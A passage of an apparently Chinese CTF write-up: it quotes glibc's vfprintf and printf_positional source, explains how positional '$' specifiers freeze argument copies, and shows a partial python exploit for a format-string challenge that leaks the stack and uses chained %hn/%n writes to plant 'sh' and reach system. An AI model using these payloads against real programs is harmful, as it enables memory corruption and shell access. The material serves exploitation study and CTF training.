   space = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* '+' flag.  */\n    LABEL (flag_plus):\n      showsign = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* The '-' flag.  */\n    LABEL (flag_minus):\n      left = 1;\n      pad = L_(' ');\n      JUMP (*++f, step0_jumps);\n\n      /* The '#' flag.  */\n    LABEL (flag_hash):\n      alt = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* The '0' flag.  */\n    LABEL (flag_zero):\n      if (!left)\n\tpad = L_('0');\n      JUMP (*++f, step0_jumps);\n\n      /* The '\\'' flag.  */\n    LABEL (flag_quote):\n      group = 1;\n\n      if (grouping == (const char *) -1)\n\t{\n#ifdef COMPILE_WPRINTF\n\t  thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,\n\t\t\t\t\t    _NL_NUMERIC_THOUSANDS_SEP_WC);\n#else\n\t  thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);\n#endif\n\n\t  grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);\n\t  if (*grouping == '\\0' || *grouping == CHAR_MAX\n#ifdef COMPILE_WPRINTF\n\t      || thousands_sep == L'\\0'\n#else\n\t      || *thousands_sep == '\\0'\n#endif\n\t      )\n\t    grouping = NULL;\n\t}\n      JUMP (*++f, step0_jumps);\n\n    LABEL (flag_i18n):\n      use_outdigits = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* Get width from argument.  */\n    LABEL (width_asterics):\n      {\n\tconst UCHAR_T *tmp;\t/* Temporary value.  */\n\n\ttmp = ++f;\n\tif (ISDIGIT (*tmp))\n\t  {\n\t    int pos = read_int (&tmp);\n\n\t    if (pos == -1)\n\t      {\n\t\t__set_errno (EOVERFLOW);\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\n\t    if (pos && *tmp == L_('$'))\n\t      /* The width comes from a positional parameter.  */\n\t      goto do_positional;\n\t  }\n\twidth = va_arg (ap, int);\n\n\t/* Negative width means left justified.  */\n\tif (width < 0)\n\t  {\n\t    width = -width;\n\t    pad = L_(' ');\n\t    left = 1;\n\t  }\n      }\n      JUMP (*f, step1_jumps);\n\n      /* Given width in format string.  */\n    LABEL (width):\n      width = read_int (&f);\n\n      if (__glibc_unlikely (width == -1))\n\t{\n\t  __set_errno (EOVERFLOW);\n\t  done = -1;\n\t  goto all_done;\n\t}\n\n      if (*f == L_('$'))\n\t/* Oh, oh.  The argument comes from a positional parameter.  */\n\tgoto do_positional;\n      JUMP (*f, step1_jumps);\n\n    LABEL (precision):\n      ++f;\n      if (*f == L_('*'))\n\t{\n\t  const UCHAR_T *tmp;\t/* Temporary value.  */\n\n\t  tmp = ++f;\n\t  if (ISDIGIT (*tmp))\n\t    {\n\t      int pos = read_int (&tmp);\n\n\t      if (pos == -1)\n\t\t{\n\t\t  __set_errno (EOVERFLOW);\n\t\t  done = -1;\n\t\t  goto all_done;\n\t\t}\n\n\t      if (pos && *tmp == L_('$'))\n\t\t/* The precision comes from a positional parameter.  */\n\t\tgoto do_positional;\n\t    }\n\t  prec = va_arg (ap, int);\n\n\t  /* If the precision is negative the precision is omitted.  */\n\t  if (prec < 0)\n\t    prec = -1;\n\t}\n      else if (ISDIGIT (*f))\n\t{\n\t  prec = read_int (&f);\n\n\t  /* The precision was specified in this case as an extremely\n\t     large positive value.  */\n\t  if (prec == -1)\n\t    {\n\t      __set_errno (EOVERFLOW);\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\t}\n      else\n\tprec = 0;\n      JUMP (*f, step2_jumps);\n\n      /* Process 'h' modifier.  There might another 'h' following.  */\n    LABEL (mod_half):\n      is_short = 1;\n      JUMP (*++f, step3a_jumps);\n\n      /* Process 'hh' modifier.  */\n    LABEL (mod_halfhalf):\n      is_short = 0;\n      is_char = 1;\n      JUMP (*++f, step4_jumps);\n\n      /* Process 'l' modifier.  There might another 'l' following.  */\n    LABEL (mod_long):\n      is_long = 1;\n      JUMP (*++f, step3b_jumps);\n\n      /* Process 'L', 'q', or 'll' modifier.  No other modifier is\n\t allowed to follow.  */\n    LABEL (mod_longlong):\n      is_long_double = 1;\n      is_long = 1;\n      JUMP (*++f, step4_jumps);\n\n    LABEL (mod_size_t):\n      is_long_double = sizeof (size_t) > sizeof (unsigned long int);\n      is_long = sizeof (size_t) > sizeof (unsigned int);\n      JUMP (*++f, step4_jumps);\n\n    LABEL (mod_ptrdiff_t):\n      is_long_double = sizeof (ptrdiff_t) > sizeof (unsigned long int);\n      is_long = sizeof (ptrdiff_t) > sizeof (unsigned int);\n      JUMP (*++f, step4_jumps);\n\n    LABEL (mod_intmax_t):\n      is_long_double = sizeof (intmax_t) > sizeof (unsigned long int);\n      is_long = sizeof (intmax_t) > sizeof (unsigned int);\n      JUMP (*++f, step4_jumps);\n\n      /* Process current format.  */\n      while (1)\n\t{\n#define process_arg_int() va_arg (ap, int)\n#define process_arg_long_int() va_arg (ap, long int)\n#define process_arg_long_long_int() va_arg (ap, long long int)\n#define process_arg_pointer() va_arg (ap, void *)\n#define process_arg_string() va_arg (ap, const char *)\n#define process_arg_unsigned_int() va_arg (ap, unsigned int)\n#define process_arg_unsigned_long_int() va_arg (ap, unsigned long int)\n#define process_arg_unsigned_long_long_int() va_arg (ap, unsigned long long int)\n#define process_arg_wchar_t() va_arg (ap, wchar_t)\n#define process_arg_wstring() va_arg (ap, const wchar_t *)\n\t  process_arg ();\n\t  process_string_arg ();\n#undef process_arg_int\n#undef process_arg_long_int\n#undef process_arg_long_long_int\n#undef process_arg_pointer\n#undef process_arg_string\n#undef process_arg_unsigned_int\n#undef process_arg_unsigned_long_int\n#undef process_arg_unsigned_long_long_int\n#undef process_arg_wchar_t\n#undef process_arg_wstring\n\n\tLABEL (form_float):\n\tLABEL (form_floathex):\n\t  {\n\t    if (__glibc_unlikely ((mode_flags & PRINTF_LDBL_IS_DBL) != 0))\n\t      is_long_double = 0;\n\n\t    struct printf_info info =\n\t      {\n\t\t.prec = prec,\n\t\t.width = width,\n\t\t.spec = spec,\n\t\t.is_long_double = is_long_double,\n\t\t.is_short = is_short,\n\t\t.is_long = is_long,\n\t\t.alt = alt,\n\t\t.space = space,\n\t\t.left = left,\n\t\t.showsign = showsign,\n\t\t.group = group,\n\t\t.pad = pad,\n\t\t.extra = 0,\n\t\t.i18n = use_outdigits,\n\t\t.wide = sizeof (CHAR_T) != 1,\n\t\t.is_binary128 = 0\n\t      };\n\n\t    PARSE_FLOAT_VA_ARG_EXTENDED (info);\n\t    const void *ptr = &the_arg;\n\n\t    int function_done = __printf_fp_spec (s, &info, &ptr);\n\t    if (function_done < 0)\n\t      {\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\t    done_add (function_done);\n\t  }\n\t  break;\n\n\tLABEL (form_unknown):\n\t  if (spec == L_('\\0'))\n\t    {\n\t      /* The format string ended before the specifier is complete.  */\n\t      __set_errno (EINVAL);\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\n\t  /* If we are in the fast loop force entering the complicated\n\t     one.  */\n\t  goto do_positional;\n\t}\n\n      /* The format is correctly handled.  */\n      ++nspecs_done;\n\n      /* Look for next format specifier.  */\n#ifdef COMPILE_WPRINTF\n      f = __find_specwc ((end_of_spec = ++f));\n#else\n      f = __find_specmb ((end_of_spec = ++f));\n#endif\n\n      /* Write the following constant string.  */\n      outstring (end_of_spec, f - end_of_spec);\n    }\n  while (*f != L_('\\0'));\n\n  /* Unlock stream and return.  */\n  goto all_done;\n\n  /* Hand off processing for positional parameters.  */\ndo_positional:\n  done = printf_positional (s, format, readonly_format, ap, &ap_save,\n\t\t\t    done, nspecs_done, lead_str_end, work_buffer,\n\t\t\t    save_errno, grouping, thousands_sep, mode_flags);\n\n all_done:\n  /* Unlock the stream.  */\n  _IO_funlockfile (s);\n  _IO_cleanup_region_end (0);\n\n  return done;\n}\n```\n### printf_positional\n\n```c\nstatic int\nprintf_positional (FILE *s, const CHAR_T *format, int readonly_format,\n\t\t   va_list ap, va_list *ap_savep, int done, int nspecs_done,\n\t\t   const UCHAR_T *lead_str_end,\n\t\t   CHAR_T *work_buffer, int save_errno,\n\t\t   const char *grouping, THOUSANDS_SEP_T thousands_sep,\n\t\t   unsigned int mode_flags)\n{\n  /* For positional argument handling.  */\n  struct scratch_buffer specsbuf;\n  scratch_buffer_init (&specsbuf);\n  struct printf_spec *specs = specsbuf.data;\n  size_t specs_limit = specsbuf.length / sizeof (specs[0]);\n\n  /* Used as a backing store for args_value, args_size, args_type\n     below.  */\n  struct scratch_buffer argsbuf;\n  scratch_buffer_init (&argsbuf);\n\n  /* Array with information about the needed arguments.  This has to\n     be dynamically extensible.  */\n  size_t nspecs = 0;\n\n  /* The number of arguments the format string requests.  This will\n     determine the size of the array needed to store the argument\n     attributes.  */\n  size_t nargs = 0;\n\n  /* Positional parameters refer to arguments directly.  This could\n     also determine the maximum number of arguments.  Track the\n     maximum number.  */\n  size_t max_ref_arg = 0;\n\n  /* Just a counter.  */\n  size_t cnt;\n\n  if (grouping == (const char *) -1)\n    {\n#ifdef COMPILE_WPRINTF\n      thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,\n\t\t\t\t\t_NL_NUMERIC_THOUSANDS_SEP_WC);\n#else\n      thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);\n#endif\n\n      grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);\n      if (*grouping == '\\0' || *grouping == CHAR_MAX)\n\tgrouping = NULL;\n    }\n\n  for (const UCHAR_T *f = lead_str_end; *f != L_('\\0');\n       f = specs[nspecs++].next_fmt)\n    {\n      if (nspecs == specs_limit)\n\t{\n\t  if (!scratch_buffer_grow_preserve (&specsbuf))\n\t    {\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\t  specs = specsbuf.data;\n\t  specs_limit = specsbuf.length / sizeof (specs[0]);\n\t}\n\n      /* Parse the format specifier.  */\n#ifdef COMPILE_WPRINTF\n      nargs += __parse_one_specwc (f, nargs, &specs[nspecs], &max_ref_arg);\n#else\n      nargs += __parse_one_specmb (f, nargs, &specs[nspecs], &max_ref_arg);\n#endif\n    }\n\n  /* Determine the number of arguments the format string consumes.  */\n  nargs = MAX (nargs, max_ref_arg);\n\n  union printf_arg *args_value;\n  int *args_size;\n  int *args_type;\n  {\n    /* Calculate total size needed to represent a single argument\n       across all three argument-related arrays.  */\n    size_t bytes_per_arg\n      = sizeof (*args_value) + sizeof (*args_size) + sizeof (*args_type);\n    if (!scratch_buffer_set_array_size (&argsbuf, nargs, bytes_per_arg))\n      {\n\tdone = -1;\n\tgoto all_done;\n      }\n    args_value = argsbuf.data;\n    /* Set up the remaining two arrays to each point past the end of\n       the prior array, since space for all three has been allocated\n       now.  */\n    args_size = &args_value[nargs].pa_int;\n    args_type = &args_size[nargs];\n    memset (args_type, (mode_flags & PRINTF_FORTIFY) != 0 ? '\\xff' : '\\0',\n\t    nargs * sizeof (*args_type));\n  }\n\n  /* XXX Could do sanity check here: If any element in ARGS_TYPE is\n     still zero after this loop, format is invalid.  For now we\n     simply use 0 as the value.  */\n\n  /* Fill in the types of all the arguments.  */\n  for (cnt = 0; cnt < nspecs; ++cnt)\n    {\n      /* If the width is determined by an argument this is an int.  */\n      if (specs[cnt].width_arg != -1)\n\targs_type[specs[cnt].width_arg] = PA_INT;\n\n      /* If the precision is determined by an argument this is an int.  */\n      if (specs[cnt].prec_arg != -1)\n\targs_type[specs[cnt].prec_arg] = PA_INT;\n\n      switch (specs[cnt].ndata_args)\n\t{\n\tcase 0:\t\t/* No arguments.  */\n\t  break;\n\tcase 1:\t\t/* One argument; we already have the\n\t\t\t   type and size.  */\n\t  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;\n\t  args_size[specs[cnt].data_arg] = specs[cnt].size;\n\t  break;\n\tdefault:\n\t  /* We have more than one argument for this format spec.\n\t     We must call the arginfo function again to determine\n\t     all the types.  */\n\t  (void) (*__printf_arginfo_table[specs[cnt].info.spec])\n\t    (&specs[cnt].info,\n\t     specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n\t     &args_size[specs[cnt].data_arg]);\n\t  break;\n\t}\n    }\n\n  /* Now we know all the types and the order.  Fill in the argument\n     values.  */\n  for (cnt = 0; cnt < nargs; ++cnt)\n    switch (args_type[cnt])\n      {\n#define T(tag, mem, type)\t\t\t\t\\\n\tcase tag:\t\t\t\t\t\\\n\t  args_value[cnt].mem = va_arg (*ap_savep, type); \\\n\t  break\n\n\tT (PA_WCHAR, pa_wchar, wint_t);\n      case PA_CHAR:\t\t\t\t/* Promoted.  */\n      case PA_INT|PA_FLAG_SHORT:\t\t/* Promoted.  */\n#if LONG_MAX == INT_MAX\n      case PA_INT|PA_FLAG_LONG:\n#endif\n\tT (PA_INT, pa_int, int);\n#if LONG_MAX == LONG_LONG_MAX\n      case PA_INT|PA_FLAG_LONG:\n#endif\n\tT (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, long long int);\n#if LONG_MAX != INT_MAX && LONG_MAX != LONG_LONG_MAX\n# error \"he?\"\n#endif\n      case PA_FLOAT:\t\t\t\t/* Promoted.  */\n\tT (PA_DOUBLE, pa_double, double);\n      case PA_DOUBLE|PA_FLAG_LONG_DOUBLE:\n\tif (__glibc_unlikely ((mode_flags & PRINTF_LDBL_IS_DBL) != 0))\n\t  {\n\t    args_value[cnt].pa_double = va_arg (*ap_savep, double);\n\t    args_type[cnt] &= ~PA_FLAG_LONG_DOUBLE;\n\t  }\n#if __HAVE_FLOAT128_UNLIKE_LDBL\n\telse if ((mode_flags & PRINTF_LDBL_USES_FLOAT128) != 0)\n\t  args_value[cnt].pa_float128 = va_arg (*ap_savep, _Float128);\n#endif\n\telse\n\t  args_value[cnt].pa_long_double = va_arg (*ap_savep, long double);\n\tbreak;\n      case PA_STRING:\t\t\t\t/* All pointers are the same */\n      case PA_WSTRING:\t\t\t/* All pointers are the same */\n\tT (PA_POINTER, pa_pointer, void *);\n#undef T\n      default:\n\tif ((args_type[cnt] & PA_FLAG_PTR) != 0)\n\t  args_value[cnt].pa_pointer = va_arg (*ap_savep, void *);\n\telse if (__glibc_unlikely (__printf_va_arg_table != NULL)\n\t\t && __printf_va_arg_table[args_type[cnt] - PA_LAST] != NULL)\n\t  {\n\t    args_value[cnt].pa_user = alloca (args_size[cnt]);\n\t    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])\n\t      (args_value[cnt].pa_user, ap_savep);\n\t  }\n\telse\n\t  memset (&args_value[cnt], 0, sizeof (args_value[cnt]));\n\tbreak;\n      case -1:\n\t/* Error case.  Not all parameters appear in N$ format\n\t   strings.  We have no way to determine their type.  */\n\tassert ((mode_flags & PRINTF_FORTIFY) != 0);\n\t__libc_fatal (\"*** invalid %N$ use detected ***\\n\");\n      }\n\n  /* Now walk through all format specifiers and process them.  */\n  for (; (size_t) nspecs_done < nspecs; ++nspecs_done)\n    {\n      STEP4_TABLE;\n\n      int is_negative;\n      union\n      {\n\tunsigned long long int longlong;\n\tunsigned long int word;\n      } number;\n      int base;\n      CHAR_T *string;\t\t/* Pointer to argument string.  */\n\n      /* Fill variables from values in struct.  */\n      int alt = specs[nspecs_done].info.alt;\n      int space = specs[nspecs_done].info.space;\n      int left = specs[nspecs_done].info.left;\n      int showsign = specs[nspecs_done].info.showsign;\n      int group = specs[nspecs_done].info.group;\n      int is_long_double __attribute__ ((unused))\n\t= specs[nspecs_done].info.is_long_double;\n      int is_short = specs[nspecs_done].info.is_short;\n      int is_char = specs[nspecs_done].info.is_char;\n      int is_long = specs[nspecs_done].info.is_long;\n      int width = specs[nspecs_done].info.width;\n      int prec = specs[nspecs_done].info.prec;\n      int use_outdigits = specs[nspecs_done].info.i18n;\n      char pad = specs[nspecs_done].info.pad;\n      CHAR_T spec = specs[nspecs_done].info.spec;\n\n      CHAR_T *workend = work_buffer + WORK_BUFFER_SIZE;\n\n      /* Fill in last information.  */\n      if (specs[nspecs_done].width_arg != -1)\n\t{\n\t  /* Extract the field width from an argument.  */\n\t  specs[nspecs_done].info.width =\n\t    args_value[specs[nspecs_done].width_arg].pa_int;\n\n\t  if (specs[nspecs_done].info.width < 0)\n\t    /* If the width value is negative left justification is\n\t       selected and the value is taken as being positive.  */\n\t    {\n\t      specs[nspecs_done].info.width *= -1;\n\t      left = specs[nspecs_done].info.left = 1;\n\t    }\n\t  width = specs[nspecs_done].info.width;\n\t}\n\n      if (specs[nspecs_done].prec_arg != -1)\n\t{\n\t  /* Extract the precision from an argument.  */\n\t  specs[nspecs_done].info.prec =\n\t    args_value[specs[nspecs_done].prec_arg].pa_int;\n\n\t  if (specs[nspecs_done].info.prec < 0)\n\t    /* If the precision is negative the precision is\n\t       omitted.  */\n\t    specs[nspecs_done].info.prec = -1;\n\n\t  prec = specs[nspecs_done].info.prec;\n\t}\n\n      /* Process format specifiers.  */\n      while (1)\n\t{\n\t  extern printf_function **__printf_function_table;\n\t  int function_done;\n\n\t  if (spec <= UCHAR_MAX\n\t      && __printf_function_table != NULL\n\t      && __printf_function_table[(size_t) spec] != NULL)\n\t    {\n\t      const void **ptr = alloca (specs[nspecs_done].ndata_args\n\t\t\t\t\t * sizeof (const void *));\n\n\t      /* Fill in an array of pointers to the argument values.  */\n\t      for (unsigned int i = 0; i < specs[nspecs_done].ndata_args;\n\t\t   ++i)\n\t\tptr[i] = &args_value[specs[nspecs_done].data_arg + i];\n\n\t      /* Call the function.  */\n\t      function_done = __printf_function_table[(size_t) spec]\n\t\t(s, &specs[nspecs_done].info, ptr);\n\n\t      if (function_done != -2)\n\t\t{\n\t\t  /* If an error occurred we don't have information\n\t\t     about # of chars.  */\n\t\t  if (function_done < 0)\n\t\t    {\n\t\t      /* Function has set errno.  */\n\t\t      done = -1;\n\t\t      goto all_done;\n\t\t    }\n\n\t\t  done_add (function_done);\n\t\t  break;\n\t\t}\n\t    }\n\n\t  JUMP (spec, step4_jumps);\n\n#define process_arg_data args_value[specs[nspecs_done].data_arg]\n#define process_arg_int() process_arg_data.pa_int\n#define process_arg_long_int() process_arg_data.pa_long_int\n#define process_arg_long_long_int() process_arg_data.pa_long_long_int\n#define process_arg_pointer() process_arg_data.pa_pointer\n#define process_arg_string() process_arg_data.pa_string\n#define process_arg_unsigned_int() process_arg_data.pa_u_int\n#define process_arg_unsigned_long_int() process_arg_data.pa_u_long_int\n#define process_arg_unsigned_long_long_int() process_arg_data.pa_u_long_long_int\n#define process_arg_wchar_t() process_arg_data.pa_wchar\n#define process_arg_wstring() process_arg_data.pa_wstring\n\t  process_arg ();\n\t  process_string_arg ();\n#undef process_arg_data\n#undef process_arg_int\n#undef process_arg_long_int\n#undef process_arg_long_long_int\n#undef process_arg_pointer\n#undef process_arg_string\n#undef process_arg_unsigned_int\n#undef process_arg_unsigned_long_int\n#undef process_arg_unsigned_long_long_int\n#undef process_arg_wchar_t\n#undef process_arg_wstring\n\n\t  LABEL (form_float):\n\t  LABEL (form_floathex):\n\t  {\n\t    const void *ptr\n\t      = (const void *) &args_value[specs[nspecs_done].data_arg];\n\t    if (__glibc_unlikely ((mode_flags & PRINTF_LDBL_IS_DBL) != 0))\n\t      {\n\t\tspecs[nspecs_done].data_arg_type = PA_DOUBLE;\n\t\tspecs[nspecs_done].info.is_long_double = 0;\n\t      }\n\t    SETUP_FLOAT128_INFO (specs[nspecs_done].info);\n\n\t    int function_done\n\t      = __printf_fp_spec (s, &specs[nspecs_done].info, &ptr);\n\t    if (function_done < 0)\n\t      {\n\t\t/* Error in print handler; up to handler to set errno.  */\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\t    done_add (function_done);\n\t  }\n\t  break;\n\n\t  LABEL (form_unknown):\n\t  {\n\t    unsigned int i;\n\t    const void **ptr;\n\n\t    ptr = alloca (specs[nspecs_done].ndata_args\n\t\t\t  * sizeof (const void *));\n\n\t    /* Fill in an array of pointers to the argument values.  */\n\t    for (i = 0; i < specs[nspecs_done].ndata_args; ++i)\n\t      ptr[i] = &args_value[specs[nspecs_done].data_arg + i];\n\n\t    /* Call the function.  */\n\t    function_done = printf_unknown (s, &specs[nspecs_done].info,\n\t\t\t\t\t    ptr);\n\n\t    /* If an error occurred we don't have information about #\n\t       of chars.  */\n\t    if (function_done < 0)\n\t      {\n\t\t/* Function has set errno.  */\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\n\t    done_add (function_done);\n\t  }\n\t  break;\n\t}\n\n      /* Write the following constant string.  */\n      outstring (specs[nspecs_done].end_of_fmt,\n\t\t specs[nspecs_done].next_fmt\n\t\t - specs[nspecs_done].end_of_fmt);\n    }\n all_done:\n  scratch_buffer_free (&argsbuf);\n  scratch_buffer_free (&specsbuf);\n  return done;\n}\n```\n\n## 解析流程\n\n### 无 \"$\"符\n\n没有\"$\"符，程序就会在这里跳来跳起，完成全部解析\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811180756048.png)\n\n我们来表中是什么\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811181243402.png)\n\n\n关于LABEL (form_number)的源码在上文中有，这里不再赘述。它的功能就顺序往参数里写数据，并且是实时的。\n\n关于LABEL(unknown)的源码上文也有，功能也就是检测当前字符是否为终止符，是则结束，不是则继续。\n\n### 有\"$\" 符\n\n在vfprintf的do循环中会获取当前字符，并进行一次跳表的寻找找到对应字符的操作函数，跳转执行。\n如果遇到`$`符，或者遇到`unknown`的字符，就会调用`printf_positional`,去做复杂的字符串的解析\n```c\n  union printf_arg *args_value;\n  int *args_size;\n  int *args_type;\n  {\n    /* Calculate total size needed to represent a single argument\n       across all three argument-related arrays.  */\n    size_t bytes_per_arg\n      = sizeof (*args_value) + sizeof (*args_size) + sizeof (*args_type);\n    if (!scratch_buffer_set_array_size (&argsbuf, nargs, bytes_per_arg))\n      {\n\tdone = -1;\n\tgoto all_done;\n      }\n    args_value = argsbuf.data;\n    /* Set up the remaining two arrays to each point past the end of\n       the prior array, since space for all three has been allocated\n       now.  */\n    args_size = &args_value[nargs].pa_int;\n    args_type = &args_size[nargs];\n    memset (args_type, (mode_flags & PRINTF_FORTIFY) != 0 ? '\\xff' : '\\0',\n\t    nargs * sizeof (*args_type));\n  }\n\n  /* XXX Could do sanity check here: If any element in ARGS_TYPE is\n     still zero after this loop, format is invalid.  For now we\n     simply use 0 as the value.  */\n\n  /* Fill in the types of all the arguments.  */\n  for (cnt = 0; cnt < nspecs; ++cnt)\n    {\n      /* If the width is determined by an argument this is an int.  */\n      if (specs[cnt].width_arg != -1)\n\targs_type[specs[cnt].width_arg] = PA_INT;\n\n      /* If the precision is determined by an argument this is an int.  */\n      if (specs[cnt].prec_arg != -1)\n\targs_type[specs[cnt].prec_arg] = PA_INT;\n\n      switch (specs[cnt].ndata_args)\n\t{\n\tcase 0:\t\t/* No arguments.  */\n\t  break;\n\tcase 1:\t\t/* One argument; we already have the\n\t\t\t   type and size.  */\n\t  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;\n\t  args_size[specs[cnt].data_arg] = specs[cnt].size;\n\t  break;\n\tdefault:\n\t  /* We have more than one argument for this format spec.\n\t     We must call the arginfo function again to determine\n\t     all the types.  */\n\t  (void) (*__printf_arginfo_table[specs[cnt].info.spec])\n\t    (&specs[cnt].info,\n\t     specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n\t     &args_size[specs[cnt].data_arg]);\n\t  break;\n\t}\n    }\n```\n\n在这段代码中，`printf_positional` 把相关的参数 保存成了副本。后续对格式化字符串的参数处理，都是通过副本做处理。\n所以说，以第一个`$`符或者`unknown`的字符为界，前面通过`vfprintf_internal` 解析处理，后面通过`printf_positional`处理。\n\n### 小结\n\n如果我们想一次格式化字符串去栈上做任意地址写，需要利用这个特性。假设我们有一个非栈上格式化字符串的机会，栈上存在如下数据：\n$$\n\\begin{flalign*}\nA &=> B => C & \\\\\\\\\nB &=> C & \\\\\\\\\n&\\ldots & \\\\\\\\\nD &=> E &\n\\end{flalign*}\n$$\n如果我们需要修改`D`的值为`F`, 那么我们必须先把`B` 的值改`D`，然后在通过B这个偏移去修改。 假设A 的偏移为8，\n这部分`fmt` 就是 :\n```python\npayload1 = b\"%p\"*6\npayload1 += \"%{}c%hn\".format(D_low-60).encode()\npayload1 += \"%{}c%9$hn\".format(E_low-D_low+60).encode()\n# 如果用$符写，当然不能这么用，因为会使第二次写入失败\n# 以下是反面教材，属于想得很美\npayload2 = \"%{}c%8$hn\".format(D_low).encode()\npayload2 += \"%{}c%9$hn\".format(E_low-D_low).encode()\n```\n\n根据上文的介绍，我们不难理解，printf 在处理这些字符串其实是按顺序来的。第一个`%n`两个payload都是可以修改成功的，但是第二个`%n` payload2 是 写不上的。或者说它其实是往`C`中写了数据。\n因为`$`符，让payload2 在第一个`%n`处就已经把所有的参数都固定了，修改后，栈上是变量，但是后续的写入，不会同步这个变化。而payload1是在第二个 `%n` 才固定参数，这个时候，第9个参数已经变了，所以可以写成功。\n\n# 例题\n\n\n\n## 前言\n\n一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。\n[一次有趣的格式化字符串漏洞利用 | ZIKH26's Blog](https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4)\n开始研究\n\n## ida分析\n\n### main函数\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png)\n\n功能非常的简单，\n\n1. 循环3次调用talk，需要控制flag的值（后续再看）\n2. atk判断，成功则调用he()\n\n先看he()里有啥。\n\n### he函数\n\n![he函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png)\n\n这里建议看汇编，\n\n1. system的出现，让人思路开朗\n2. command是`-0xe`，也就是要控制`rbp-0xe`\n3. 注意lea 和 mov 的区别，通过这个方法的话，必须要把\"/bin/sh\"写在栈上\n\n一般揣测一下出题人的想法，肯定是最后要返回到这里了。\n\n### talk函数\n\n![talk](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png)\n\n重点来了，\n\n1. 非栈上格式化字符串,每次只读0x20字节\n2. flag初始是0,talk会把它变成1,想办法置0\n3. 返回到了my_read,继续追踪\n\n![my_read](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png)\n\n看看bss段上,这些变量的位置\n\n![bss](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png)\n\natk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.\n\n## 思路分析\n\n1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell\n2.但是，常规的思路，需要的格式化次数不止3次。\n\n> 1. %p泄露栈地址\n> 2. 把rbp链入（因为此题目栈上无`诸葛连弩`，要自己建）\n> 3. 修改啥也不行，没次数了\n\n3.所以笔者在这里用了一些奇怪的方法。\n\n>1. 笔者开始想，因为`i`也是在栈上的，所以我可以修改`i`来增加次数\n>2. 但是，恰因如此，如果修改rbp，那么会影响下次循环对`i`的判断，\n>3. 于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。\n>4. 所以在笔者的精心的构造下，完成了10次格式化字符串的修改。\n>5. 比较重要的就是两个$n的运用。一个把`sh`写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.\n\n4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.\n\n## exp\n\n### 10次格式化字符串\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\n\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2，3 rbp链入,修改rbp \npayload = '%{}c%6$hn'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#4,5,6 'sh'写入栈,修改rbp,把rbp+0x3e-4 链入并置0\npayload = '%{}c%8$n\\x00'.format(0x6873).encode() # 1 canshuxieshangl\n\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn'.format(rbp_low+0x58).encode()\npayload+= '%{}c%6$hn\\x00'.format((0x38+0xe-4-0x58+0x10000)%0x10000).encode() # 0\nprint(5)\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$n\\x00'.format(0x00).format() # 1\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n\n######7 把rbp再次链入\npayload = '%{}c%6$hn\\x00'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#####8 修改rbp 为rbp_low+0x38+0xe\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38+0xe).encode()\npayload = payload.ljust(0x20,b'\\x00')\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\ngdb.attach(io,\"b *0x401332\")\n##### 9 把rbp+8 链入\npayload = 